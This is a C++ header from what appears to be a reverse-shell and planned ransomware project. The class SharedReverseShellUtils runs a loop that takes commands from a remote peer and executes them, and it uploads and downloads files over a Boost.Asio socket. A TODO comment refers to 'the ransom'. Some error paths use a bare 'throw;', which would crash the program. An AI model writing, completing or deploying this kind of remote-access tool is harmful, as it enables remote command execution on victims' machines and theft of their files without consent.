#pragma once

#include <array>
#include <fstream>
#include <boost/asio.hpp>
#include <string>
#include <iostream>
#include <filesystem>

#define DEFAULT_BUFFER_SIZE 1024

//TODO - In the ransom move thise to another place
bool IsRegularFileExists(const std::filesystem::path& filePath)
{
	return (std::filesystem::exists(filePath) && std::filesystem::is_regular_file(filePath));
}

template<typename T>
class SharedReverseShellUtils
{
public:
	SharedReverseShellUtils(T * caller)
		:m_caller(caller) {}
	
	void Start()
	{
		while (true)
		{
			switch (m_caller->ReadOperationType())
			{
			case RunCommand:
				m_caller->Command();
				break;
			case DownloadFile:
				m_caller->Download();
				break;
			case UploadFile:
				m_caller->Upload();
				break;
			default:
				m_caller->InvalidOperation();
				break;
			}

			m_responseBuf.consume(m_responseBuf.size());
		}
	}

	size_t Send(const std::string& message)
	{
		auto request = message + m_delimiter;
		auto buf = boost::asio::buffer(request, request.size());
		return Send(buf);
	}

	size_t Send(const boost::asio::mutable_buffer& t_buffer)
	{
		auto bytesSent = boost::asio::write(m_caller->m_socket, t_buffer, m_errorCode);
		if (m_errorCode)
			throw; // TODO - handle error (reset the connection & reset the m_errorCode to 0)

		return bytesSent;
	}

	void Upload(const std::string& localFilePath)
	{
		auto fileSize = std::filesystem::file_size(localFilePath);
		Send(std::to_string(fileSize));
		OpenFileFor(localFilePath, std::ios::in | std::ios::binary);
		UploadFileBytes(fileSize);
	}

	void UploadFileBytes(int fileSize)
	{
		size_t bytesSent = 0;
		while (fileSize > 0)
		{
			std::array<char, DEFAULT_BUFFER_SIZE> response;
			BytesFromFileToBuffer(response);
			size_t bufferSize(m_file.gcount());
			auto buf = boost::asio::buffer(response.data(), bufferSize);
			bytesSent += Send(buf);

			fileSize -= bufferSize;
		}
		m_file.close();

		std::cout << "Total bytes sent: " << bytesSent << std::endl;
	}

	void BytesFromFileToBuffer(std::array<char, DEFAULT_BUFFER_SIZE>& response)
	{
		m_file.read(response.data(), response.size());
		if (m_file.fail() && !m_file.eof())
			throw std::fstream::failure("Failed while reading file");
	}


	void Download(const std::string& filePath)
	{
		auto amountOfBytes = std::stoi(Response());
		BytesFromSocketToFile(amountOfBytes);
		std::cout << "Finished Downloading " << filePath << std::endl;
	}

	void BytesFromSocketToFile(int amountOfBytes)
	{
		WriteLeakedBytes();
		while (m_file.tellp() < amountOfBytes)
		{
			std::array<char, DEFAULT_BUFFER_SIZE> response;
			auto bufferSize = std::min(static_cast<int>(m_caller->m_socket.available()), DEFAULT_BUFFER_SIZE);
			std::cout << "Available: " << m_caller->m_socket.available() << "  Asking: " << bufferSize << std::endl; // TODO - delete this line
			auto buf = boost::asio::buffer(response, bufferSize);
			auto responseSize = boost::asio::read(m_caller->m_socket, buf, m_errorCode);
			m_file.write(response.data(), responseSize);
			std::cout << "Target: " << amountOfBytes << "   Current: " << m_file.tellp() << " Response size: " << responseSize << std::endl;
		}
		std::cout << "Closing file stream" << std::endl;
		m_file.close();
	}

	void WriteLeakedBytes()
	{
		std::istream requestStream(&m_responseBuf);
		do {
			std::array<char, DEFAULT_BUFFER_SIZE> response;
			requestStream.read(response.data(), response.size());
			std::cout << "==================================== " << requestStream.gcount() << " ====================================" << std::endl;
			m_file.write(response.data(), requestStream.gcount());
		} while (requestStream.gcount() > 0);
	}

	std::string Response()
	{
		auto responseSize = boost::asio::read_until(m_caller->m_socket, m_responseBuf, m_delimiter, m_errorCode);
		if (m_errorCode)
			throw; // TODO - handle error

		return CleanReponse(responseSize);
	}

	void OpenFileFor(const std::string& filePath, int mode)
	{
		m_file.open(filePath, mode);
		if (!m_file)
			throw; // TODO - throw specific exception
	}

private:
	std::string CleanReponse(size_t responseSize)
	{
		std::string response(
			buffers_begin(m_responseBuf.data()),
			buffers_begin(m_responseBuf.data()) + responseSize - m_delimiter.size()
		);
		m_responseBuf.consume(responseSize);

		return response;
	}

public:
	enum OperationType { RunCommand = 1, DownloadFile, UploadFile, Invalid };
	OperationType GetOperationType(const std::string& operation)
	{
		std::unordered_map<std::string, OperationType> operations
		{
			{"1", RunCommand},
			{"2", DownloadFile},
			{"3", UploadFile}
		};

		if (!operations.count(operation))
			return Invalid;

		return operations[operation];
	}

private:
	T* m_caller;
	boost::asio::streambuf m_responseBuf;
	const std::string m_delimiter = "\r\n\r\n";
	std::fstream m_file;
public:
	boost::system::error_code m_errorCode;
};
